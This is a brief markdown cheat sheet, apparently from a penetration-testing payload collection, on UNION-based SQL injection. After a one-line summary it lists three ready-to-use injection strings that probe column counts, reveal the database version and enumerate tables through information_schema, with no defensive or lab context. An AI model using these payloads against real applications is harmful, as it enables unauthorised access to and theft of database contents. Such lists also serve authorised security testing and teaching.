# UNION-Based SQL Injection

## Summary
Extract data using UNION SELECT.

## Payloads
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
```
